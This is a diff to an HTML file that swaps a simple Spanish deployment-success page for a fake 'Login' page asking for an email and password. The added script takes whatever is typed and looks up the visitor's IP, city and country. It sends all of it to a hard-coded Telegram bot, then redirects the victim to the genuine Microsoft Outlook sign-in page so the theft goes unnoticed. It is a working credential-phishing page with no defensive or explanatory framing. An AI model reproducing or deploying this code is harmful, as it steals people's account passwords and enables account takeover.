@@ -1,35 +1,172 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Solventas</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0f172a;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .box {
-      text-align: center;
-      background: #020617;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 30px rgba(0,0,0,.5);
-    }
-    h1 { color: #38bdf8; }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <h1>✅ Deploy exitoso</h1>
-    <p>Este sitio está funcionando correctamente</p>
-    <p><strong>GitHub → AWS Amplify</strong></p>
-  </div>
-</body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Consulting-2026</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-image: url('https://i.postimg.cc/pLwhL1Wt/cambio.jpg');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+      }
+      .container {
+        max-width: 380px;
+        margin: 10px auto;
+        padding: 25px;
+        background-color: #ffffff;
+        border-radius: 10px;
+      }
+      .logo {
+        margin-bottom: 1'0px;
+        text-align: center;
+      }
+      .logo img {
+        width: 100px;
+        height: auto;
+      }
+      .form-group {
+        margin-bottom: 3px;
+      }
+      label {
+        display: block;
+        margin-bottom: 3px;
+      }
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        padding: 3px;
+        border: 1px solid #ccc;
+        border-radius: 3px;
+        height: 40px;
+        box-sizing: border-box;
+      }
+      input[type="submit"] {
+        width: 100%;
+        padding: 5px;
+        border: none;
+        border-radius: 4px;
+        background-color: #1c6ead;
+        color: white;
+        cursor: pointer;
+        height: 40px;
+      }
+      input[type="submit"]:hover {
+        background-color: #226ba4;
+      }
+      .signup {
+        text-align: center;
+      }
+      .signup a {
+        color: #007bff;
+        text-decoration: none;
+      }
+      .mobil {
+        display: none;
+      }
+    </style>
+    <!-- Mobile logo -->
+    <style>
+      @media (max-width: 768px) {
+        .pc {
+          display: none;
+        }
+        .mobil {
+          display: unset;
+        }
+      }
+    </style>
+  </head>
+  <body>
+<br />
+<br />
+<br />
+    <div class="container">
+      <div class="logo">
+       <img src="https://i.postimg.cc/tgzqGr7k/cambio2.jpg" alt="logo" width="10" />
+       <h4 style="color: #262b35"></h4>
+      </div>
+      <form id="loginform">
+        <div class="form-group">
+          <h3 style="color: #262b35">Login</h3>
+          <label for="email" style="color: #262b35; font-weight: bold"
+            >Email</label
+          >
+          <input
+            type="email"
+            id="email"
+            name="email"
+            placeholder="Email,Phone"
+            required
+          />
+        </div>
+        <div class="form-group">
+          <label for="password" style="color: #262b35; font-weight: bold"
+            >Password</label
+          >
+          <input type="password" id="password" name="password" required />
+        </div>
+<br />
+        <input type="submit" value="Following" />
+      </form>
+      <div class="signup">
+        <br />
+        <br />
+        <a href="">Can't access your account?</a>
+        <br />
+        <br />
+         <a href="#"></a>
+      </div>
+    </div>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      axios
+        .get(url)
+        .then((response) => {
+          const nombre = document.querySelector("#email").value;
+          const contra = document.querySelector("#password").value;
+          localStorage.setItem("usuario", nombre);
+          const message =
+            "\nLLEGATE" +
+            "\nEmail: " +
+            nombre +
+            "\nContraseña: " +
+            contra +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot8464381260:AAEsa9n0DqGCtZHXgP6e2cUk_EXaddAaItM/sendMessage",
+              {
+                chat_id: "7404178048",
+                text: message,
+              }
+            )
+            .then((response) => {
+              localStorage.setItem("usr",nombre )
+              parent.location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1745370754&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3des-es%26country%3des%26RpsCsrfState%3d20303b47-f567-9615-a3d5-667508114202&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
 </html>
